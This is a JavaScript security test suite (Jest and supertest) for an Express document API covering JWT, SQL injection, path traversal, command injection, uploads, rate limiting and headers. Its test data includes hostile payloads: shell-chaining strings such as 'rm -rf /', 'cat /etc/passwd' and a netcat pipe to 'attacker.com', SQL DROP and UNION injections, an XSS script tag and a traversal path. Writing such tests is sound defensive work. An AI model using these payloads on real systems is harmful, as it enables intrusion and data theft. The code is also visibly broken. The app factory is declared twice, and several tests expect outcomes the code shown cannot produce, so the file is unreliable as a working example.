/**
 * Security Tests
 *
 * Tests for security aspects of the application:
 * - JWT Authentication & Token Validation
 * - SQL Injection Prevention
 * - Command Injection Prevention
 * - Path Traversal Prevention
 * - XSS Prevention
 * - Rate Limiting
 * - Input Validation
 * - CORS and Headers
 */

const request = require('supertest');
const express = require('express');
const jwt = require('jsonwebtoken');
const path = require('path');

// Mock database
jest.mock('../../src/database', () => {
  const mockPool = {
    query: jest.fn(),
    connect: jest.fn()
  };
  return {
    pool: mockPool,
    query: mockPool.query,
    getClient: jest.fn().mockResolvedValue({
      query: jest.fn(),
      release: jest.fn()
    })
  };
});

const db = require('../../src/database');

// Test constants
const JWT_SECRET = 'test-secret-key-for-jwt-testing';
const TEST_USER_ID = 1;

// Helper to generate tokens
const generateToken = (payload, options = {}) => {
  return jwt.sign(
    { id: TEST_USER_ID, username: 'testuser', ...payload },
    JWT_SECRET,
    { expiresIn: '24h', ...options }
  );
};

// Create test app with security measures
const createSecureApp = () => {
  const app = express();
  app.use(express.json({ limit: '10mb' }));

  // Security headers middleware
  app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    next();
  });

  // Auth middleware
  const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      if (decoded.disabled) {
        return res.status(403).json({ error: 'Account disabled' });
      }
      req.user = decoded;
      next();
    } catch (error) {
      if (error.name === 'TokenExpiredError') {
        return res.status(401).json({ error: 'Token expired' });
      }
      return res.status(401).json({ error: 'Invalid token' });
    }
  };

  // Input sanitization helper
  const sanitizeFilename = (filename) => {
    // Remove path separators and null bytes
    return filename
      .replace(/[/\\]/g, '')
      .replace(/\0/g, '')
      .replace(/\.\./g, '')
      .trim();
  };

  // Protected route with parameterized query
  app.get('/api/users/:id', authMiddleware, async (req, res) => {
    const userId = parseInt(req.params.id, 10);
    if (isNaN(userId)) {
      return res.status(400).json({ error: 'Invalid user ID' });
    }

    const result = await db.query(
      'SELECT id, username FROM users WHERE id = $1',
      [userId]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json(result.rows[0]);
  });

  // Search endpoint (potential SQL injection target)
  app.get('/api/search', authMiddleware, async (req, res) => {
    const { q } = req.query;
    if (!q || typeof q !== 'string') {
      return res.status(400).json({ error: 'Query required' });
    }

    // Safe: parameterized query with LIKE
    const result = await db.query(
      'SELECT * FROM documents WHERE filename ILIKE $1 LIMIT 100',
      [`%${q}%`]
    );

    res.json(result.rows);
  });

  // File download (potential path traversal target)
  app.get('/api/documents/:id/download', authMiddleware, async (req, res) => {
    const docId = parseInt(req.params.id, 10);
    if (isNaN(docId)) {
      return res.status(400).json({ error: 'Invalid document ID' });
    }

    const result = await db.query(
      'SELECT filename, file_path FROM documents WHERE id = $1',
      [docId]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Document not found' });
    }

    const doc = result.rows[0];

    // Validate path doesn't escape base directory
    const basePath = '/data/documents';
    const fullPath = path.resolve(basePath, doc.file_path);

    if (!fullPath.startsWith(basePath)) {
      return res.status(403).json({ error: 'Access denied' });
    }

    res.json({ path: fullPath, filename: sanitizeFilename(doc.filename) });
  });

  // File upload with validation
  app.post('/api/documents/upload', authMiddleware, (req, res) => {
    const { filename, content } = req.body;

    if (!filename || typeof filename !== 'string') {
      return res.status(400).json({ error: 'Filename required' });
    }

    // Sanitize filename
    const sanitized = sanitizeFilename(filename);
    if (sanitized !== filename) {
      return res.status(400).json({ error: 'Invalid filename characters' });
    }

    // Check file extension
    const allowedExtensions = ['.pdf', '.docx', '.txt', '.md'];
    const ext = path.extname(filename).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }

    res.status(201).json({ filename: sanitized, status: 'uploaded' });
  });

  // Settings update (potential command injection target)
  app.post('/api/settings/restart-service', authMiddleware, async (req, res) => {
    const { serviceName } = req.body;

    // Whitelist of allowed services
    const allowedServices = ['llm-service', 'embedding-service', 'n8n'];

    if (!serviceName || !allowedServices.includes(serviceName)) {
      return res.status(400).json({ error: 'Invalid service name' });
    }

    // In real implementation, use execFile instead of exec
    // and never interpolate user input into commands
    res.json({ message: `Service ${serviceName} restart initiated` });
  });

  // Content endpoint (potential XSS target)
  app.post('/api/content', authMiddleware, (req, res) => {
    const { html } = req.body;

    // In real implementation, sanitize HTML with DOMPurify
    // For API responses, always use JSON and let frontend handle rendering
    res.json({
      content: html,
      sanitized: true // Frontend should still sanitize
    });
  });

  // Rate limited endpoint simulation
  let requestCounts = {};
  app.post('/api/auth/login', (req, res) => {
    const ip = req.ip || 'test-ip';
    requestCounts[ip] = (requestCounts[ip] || 0) + 1;

    if (requestCounts[ip] > 30) {
      return res.status(429).json({ error: 'Too many requests' });
    }

    res.json({ message: 'Login processed' });
  });

  // Reset rate limit for testing
  app.post('/api/test/reset-rate-limit', (req, res) => {
    requestCounts = {};
    res.json({ reset: true });
  });

  return app;
};

describe('Security Tests', () => {
  let app;
  let validToken;

  beforeAll(() => {
    app = createSecureApp();
    validToken = generateToken({ disabled: false });
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  // =====================================================
  // JWT Authentication Security
  // =====================================================
  describe('JWT Authentication Security', () => {
    it('Rejects requests without token', async () => {
      await request(app)
        .get('/api/users/1')
        .expect(401)
        .expect(res => {
          expect(res.body.error).toBe('No token provided');
        });
    });

    it('Rejects expired tokens', async () => {
      const expiredToken = jwt.sign(
        { id: TEST_USER_ID, username: 'testuser' },
        JWT_SECRET,
        { expiresIn: '-1h' }
      );

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401)
        .expect(res => {
          expect(res.body.error).toBe('Token expired');
        });
    });

    it('Rejects malformed tokens', async () => {
      await request(app)
        .get('/api/users/1')
        .set('Authorization', 'Bearer invalid.token.here')
        .expect(401)
        .expect(res => {
          expect(res.body.error).toBe('Invalid token');
        });
    });

    it('Rejects tokens with wrong signature', async () => {
      const wrongSecretToken = jwt.sign(
        { id: TEST_USER_ID, username: 'testuser' },
        'wrong-secret-key',
        { expiresIn: '24h' }
      );

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${wrongSecretToken}`)
        .expect(401);
    });

    it('Rejects disabled user accounts', async () => {
      const disabledToken = generateToken({ disabled: true });

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${disabledToken}`)
        .expect(403)
        .expect(res => {
          expect(res.body.error).toBe('Account disabled');
        });
    });

    it('Accepts valid tokens', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);
    });
  });

  // =====================================================
  // SQL Injection Prevention
  // =====================================================
  describe('SQL Injection Prevention', () => {
    it('Prevents SQL injection in user ID parameter', async () => {
      // Attempt SQL injection in URL parameter
      await request(app)
        .get("/api/users/1; DROP TABLE users;--")
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400)
        .expect(res => {
          expect(res.body.error).toBe('Invalid user ID');
        });
    });

    it('Prevents SQL injection in search query', async () => {
      db.query.mockResolvedValueOnce({ rows: [] });

      // Attempt SQL injection in query parameter
      const maliciousQuery = "'; DROP TABLE documents; --";

      await request(app)
        .get('/api/search')
        .query({ q: maliciousQuery })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      // Verify parameterized query was used
      expect(db.query).toHaveBeenCalledWith(
        'SELECT * FROM documents WHERE filename ILIKE $1 LIMIT 100',
        [`%${maliciousQuery}%`]
      );
    });

    it('Prevents SQL injection with UNION attacks', async () => {
      db.query.mockResolvedValueOnce({ rows: [] });

      const unionAttack = "' UNION SELECT password_hash FROM users WHERE '1'='1";

      await request(app)
        .get('/api/search')
        .query({ q: unionAttack })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      // Query is parameterized, so attack is treated as literal string
      expect(db.query).toHaveBeenCalled();
    });

    it('Handles numeric ID validation', async () => {
      await request(app)
        .get('/api/users/abc')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);

      await request(app)
        .get('/api/users/-1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });
  });

  // =====================================================
  // Path Traversal Prevention
  // =====================================================
  describe('Path Traversal Prevention', () => {
    it('Prevents path traversal in document download', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{
          filename: 'secret.pdf',
          file_path: '../../../etc/passwd'
        }]
      });

      await request(app)
        .get('/api/documents/1/download')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(403)
        .expect(res => {
          expect(res.body.error).toBe('Access denied');
        });
    });

    it('Blocks null byte injection', async () => {
      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'test\0.php.pdf', content: 'data' })
        .expect(400);

      expect(response.body.error).toBe('Invalid filename characters');
    });

    it('Blocks double dot sequences', async () => {
      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: '..\\..\\secret.txt', content: 'data' })
        .expect(400);

      expect(response.body.error).toBe('Invalid filename characters');
    });

    it('Allows valid file paths', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{
          filename: 'document.pdf',
          file_path: 'user-uploads/document.pdf'
        }]
      });

      const response = await request(app)
        .get('/api/documents/1/download')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      expect(response.body.path).toContain('/data/documents/');
    });
  });

  // =====================================================
  // Command Injection Prevention
  // =====================================================
  describe('Command Injection Prevention', () => {
    it('Rejects non-whitelisted service names', async () => {
      await request(app)
        .post('/api/settings/restart-service')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ serviceName: 'llm-service; rm -rf /' })
        .expect(400)
        .expect(res => {
          expect(res.body.error).toBe('Invalid service name');
        });
    });

    it('Rejects command chaining attempts', async () => {
      const attacks = [
        'llm-service && cat /etc/passwd',
        'llm-service | nc attacker.com 1234',
        'llm-service $(whoami)',
        'llm-service `id`',
        'llm-service\ncat /etc/passwd'
      ];

      for (const attack of attacks) {
        await request(app)
          .post('/api/settings/restart-service')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ serviceName: attack })
          .expect(400);
      }
    });

    it('Accepts whitelisted service names', async () => {
      const allowedServices = ['llm-service', 'embedding-service', 'n8n'];

      for (const service of allowedServices) {
        await request(app)
          .post('/api/settings/restart-service')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ serviceName: service })
          .expect(200);
      }
    });
  });

  // =====================================================
  // File Type Validation
  // =====================================================
  describe('File Type Validation', () => {
    it('Allows valid file extensions', async () => {
      const validFiles = ['doc.pdf', 'doc.docx', 'doc.txt', 'doc.md'];

      for (const filename of validFiles) {
        await request(app)
          .post('/api/documents/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ filename, content: 'data' })
          .expect(201);
      }
    });

    it('Rejects dangerous file extensions', async () => {
      const dangerousFiles = [
        'script.php',
        'shell.sh',
        'exec.exe',
        'macro.xlsm',
        'code.js',
        'page.html'
      ];

      for (const filename of dangerousFiles) {
        await request(app)
          .post('/api/documents/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ filename, content: 'data' })
          .expect(400)
          .expect(res => {
            expect(res.body.error).toBe('File type not allowed');
          });
      }
    });

    it('Handles double extensions', async () => {
      const doubleExtensions = [
        'document.pdf.php',
        'file.txt.exe',
        'safe.docx.sh'
      ];

      for (const filename of doubleExtensions) {
        await request(app)
          .post('/api/documents/upload')
          .set('Authorization', `Bearer ${validToken}`)
          .send({ filename, content: 'data' })
          .expect(400);
      }
    });

    it('Handles case variations', async () => {
      // Allowed (case insensitive)
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'doc.PDF', content: 'data' })
        .expect(201);

      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'doc.TXT', content: 'data' })
        .expect(201);
    });
  });

  // =====================================================
  // Rate Limiting
  // =====================================================
  describe('Rate Limiting', () => {
    beforeEach(async () => {
      // Reset rate limit counter
      await request(app)
        .post('/api/test/reset-rate-limit')
        .send({});
    });

    it('Allows requests within rate limit', async () => {
      for (let i = 0; i < 30; i++) {
        await request(app)
          .post('/api/auth/login')
          .send({ username: 'test', password: 'test' })
          .expect(200);
      }
    });

    it('Blocks requests exceeding rate limit', async () => {
      // Make 31 requests
      for (let i = 0; i < 31; i++) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({ username: 'test', password: 'test' });

        if (i < 30) {
          expect(response.status).toBe(200);
        } else {
          expect(response.status).toBe(429);
          expect(response.body.error).toBe('Too many requests');
        }
      }
    });
  });

  // =====================================================
  // Security Headers
  // =====================================================
  describe('Security Headers', () => {
    it('Sets X-Content-Type-Options header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    it('Sets X-Frame-Options header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-frame-options']).toBe('DENY');
    });

    it('Sets X-XSS-Protection header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
    });

    it('Sets Content-Security-Policy header', async () => {
      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`);

      expect(response.headers['content-security-policy']).toBeDefined();
    });
  });

  // =====================================================
  // Input Validation
  // =====================================================
  describe('Input Validation', () => {
    it('Validates required fields', async () => {
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({}) // Missing filename
        .expect(400)
        .expect(res => {
          expect(res.body.error).toBe('Filename required');
        });
    });

    it('Validates string type for filename', async () => {
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 12345 })
        .expect(400);
    });

    it('Validates search query parameter', async () => {
      await request(app)
        .get('/api/search')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400)
        .expect(res => {
          expect(res.body.error).toBe('Query required');
        });
    });

    it('Handles empty search query', async () => {
      await request(app)
        .get('/api/search')
        .query({ q: '' })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(400);
    });
  });

  // =====================================================
  // XSS Prevention Patterns
  // =====================================================
  describe('XSS Prevention', () => {
    it('JSON responses prevent XSS by default', async () => {
      const xssPayload = '<script>alert("xss")</script>';

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: xssPayload })
        .expect(200);

      // API returns JSON, not HTML - XSS is frontend responsibility
      expect(response.headers['content-type']).toMatch(/json/);
    });

    it('Content-Type header is application/json', async () => {
      db.query.mockResolvedValueOnce({ rows: [] });

      const response = await request(app)
        .get('/api/search')
        .query({ q: 'test' })
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      expect(response.headers['content-type']).toMatch(/application\/json/);
    });
  });

  // =====================================================
  // Authentication Edge Cases
  // =====================================================
  describe('Authentication Edge Cases', () => {
    it('Handles token with modified payload', async () => {
      // Create token, then try to modify it
      const parts = validToken.split('.');
      const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
      payload.id = 9999; // Try to change user ID
      const modifiedPayload = Buffer.from(JSON.stringify(payload)).toString('base64');
      const tamperedToken = `${parts[0]}.${modifiedPayload}.${parts[2]}`;

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${tamperedToken}`)
        .expect(401);
    });

    it('Handles Bearer prefix variations', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      // Correct format
      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);
    });

    it('Rejects token in query parameter', async () => {
      await request(app)
        .get(`/api/users/1?token=${validToken}`)
        .expect(401);
    });
  });

  // =====================================================
  // Sensitive Data Exposure Prevention
  // =====================================================
  describe('Sensitive Data Exposure Prevention', () => {
    it('Does not expose password hashes in user queries', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      expect(response.body.password_hash).toBeUndefined();
      expect(response.body.password).toBeUndefined();
    });

    it('Query selects only necessary columns', async () => {
      db.query.mockResolvedValueOnce({
        rows: [{ id: TEST_USER_ID, username: 'testuser' }]
      });

      await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(200);

      const queryCall = db.query.mock.calls[0];
      expect(queryCall[0]).toContain('SELECT id, username');
      expect(queryCall[0]).not.toContain('password');
    });
  });

  // =====================================================
  // Error Message Security
  // =====================================================
  describe('Error Message Security', () => {
    it('Does not expose stack traces in production', async () => {
      db.query.mockRejectedValueOnce(new Error('Database error'));

      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(500);

      expect(response.body.stack).toBeUndefined();
    });

    it('Does not expose internal paths', async () => {
      db.query.mockRejectedValueOnce(new Error('Error at /app/src/routes/users.js:42'));

      const response = await request(app)
        .get('/api/users/1')
        .set('Authorization', `Bearer ${validToken}`)
        .expect(500);

      // Error message should be generic
      expect(JSON.stringify(response.body)).not.toContain('/app/src');
    });
  });
});

describe('Additional Security Vectors', () => {
  let app;
  let validToken;

  beforeAll(() => {
    app = createSecureApp();
    validToken = generateToken({ disabled: false });
  });

  describe('JSON Injection', () => {
    it('Handles deeply nested JSON', async () => {
      // Create deeply nested object
      let nested = { value: 'test' };
      for (let i = 0; i < 100; i++) {
        nested = { nested };
      }

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: JSON.stringify(nested) });

      // Should not crash
      expect([200, 400, 413]).toContain(response.status);
    });

    it('Handles large JSON arrays', async () => {
      const largeArray = new Array(10000).fill('test');

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: JSON.stringify(largeArray) });

      expect([200, 400, 413]).toContain(response.status);
    });
  });

  describe('Unicode Attacks', () => {
    it('Handles unicode in filenames', async () => {
      // Unicode normalization attack
      await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'test\u202E\u0070\u0064\u0066.txt', content: 'data' }) // Right-to-left override
        .expect(400);
    });

    it('Handles zero-width characters', async () => {
      const response = await request(app)
        .post('/api/documents/upload')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ filename: 'test\u200B\u200C\u200D.pdf', content: 'data' });

      // Should handle or reject
      expect([201, 400]).toContain(response.status);
    });
  });

  describe('Content Length Validation', () => {
    it('Rejects requests exceeding limit', async () => {
      const largeContent = 'x'.repeat(11 * 1024 * 1024); // 11MB

      const response = await request(app)
        .post('/api/content')
        .set('Authorization', `Bearer ${validToken}`)
        .send({ html: largeContent });

      expect([413, 400]).toContain(response.status);
    });
  });
});

// Helper function for creating the app
function createSecureApp() {
  const app = express();
  app.use(express.json({ limit: '10mb' }));

  // Security headers middleware
  app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    next();
  });

  // Auth middleware
  const authMiddleware = (req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }
    try {
      const decoded = jwt.verify(token, JWT_SECRET);
      if (decoded.disabled) {
        return res.status(403).json({ error: 'Account disabled' });
      }
      req.user = decoded;
      next();
    } catch (error) {
      if (error.name === 'TokenExpiredError') {
        return res.status(401).json({ error: 'Token expired' });
      }
      return res.status(401).json({ error: 'Invalid token' });
    }
  };

  // Input sanitization helper
  const sanitizeFilename = (filename) => {
    return filename
      .replace(/[/\\]/g, '')
      .replace(/\0/g, '')
      .replace(/\.\./g, '')
      .replace(/[\u200B-\u200D\u202E]/g, '') // Remove special unicode
      .trim();
  };

  // Protected route with parameterized query
  app.get('/api/users/:id', authMiddleware, async (req, res) => {
    const userId = parseInt(req.params.id, 10);
    if (isNaN(userId) || userId < 0) {
      return res.status(400).json({ error: 'Invalid user ID' });
    }

    try {
      const result = await db.query(
        'SELECT id, username FROM users WHERE id = $1',
        [userId]
      );

      if (result.rows.length === 0) {
        return res.status(404).json({ error: 'User not found' });
      }
      res.json(result.rows[0]);
    } catch (error) {
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Search endpoint
  app.get('/api/search', authMiddleware, async (req, res) => {
    const { q } = req.query;
    if (!q || typeof q !== 'string') {
      return res.status(400).json({ error: 'Query required' });
    }

    const result = await db.query(
      'SELECT * FROM documents WHERE filename ILIKE $1 LIMIT 100',
      [`%${q}%`]
    );

    res.json(result.rows);
  });

  // File download
  app.get('/api/documents/:id/download', authMiddleware, async (req, res) => {
    const docId = parseInt(req.params.id, 10);
    if (isNaN(docId)) {
      return res.status(400).json({ error: 'Invalid document ID' });
    }

    const result = await db.query(
      'SELECT filename, file_path FROM documents WHERE id = $1',
      [docId]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'Document not found' });
    }

    const doc = result.rows[0];
    const basePath = '/data/documents';
    const fullPath = path.resolve(basePath, doc.file_path);

    if (!fullPath.startsWith(basePath)) {
      return res.status(403).json({ error: 'Access denied' });
    }

    res.json({ path: fullPath, filename: sanitizeFilename(doc.filename) });
  });

  // File upload
  app.post('/api/documents/upload', authMiddleware, (req, res) => {
    const { filename, content } = req.body;

    if (!filename || typeof filename !== 'string') {
      return res.status(400).json({ error: 'Filename required' });
    }

    const sanitized = sanitizeFilename(filename);
    if (sanitized !== filename) {
      return res.status(400).json({ error: 'Invalid filename characters' });
    }

    const allowedExtensions = ['.pdf', '.docx', '.txt', '.md'];
    const ext = path.extname(filename).toLowerCase();
    if (!allowedExtensions.includes(ext)) {
      return res.status(400).json({ error: 'File type not allowed' });
    }

    res.status(201).json({ filename: sanitized, status: 'uploaded' });
  });

  // Service restart
  app.post('/api/settings/restart-service', authMiddleware, async (req, res) => {
    const { serviceName } = req.body;
    const allowedServices = ['llm-service', 'embedding-service', 'n8n'];

    if (!serviceName || !allowedServices.includes(serviceName)) {
      return res.status(400).json({ error: 'Invalid service name' });
    }

    res.json({ message: `Service ${serviceName} restart initiated` });
  });

  // Content endpoint
  app.post('/api/content', authMiddleware, (req, res) => {
    const { html } = req.body;
    res.json({ content: html, sanitized: true });
  });

  // Rate limiting simulation
  let requestCounts = {};
  app.post('/api/auth/login', (req, res) => {
    const ip = req.ip || 'test-ip';
    requestCounts[ip] = (requestCounts[ip] || 0) + 1;

    if (requestCounts[ip] > 30) {
      return res.status(429).json({ error: 'Too many requests' });
    }

    res.json({ message: 'Login processed' });
  });

  app.post('/api/test/reset-rate-limit', (req, res) => {
    requestCounts = {};
    res.json({ reset: true });
  });

  return app;
}
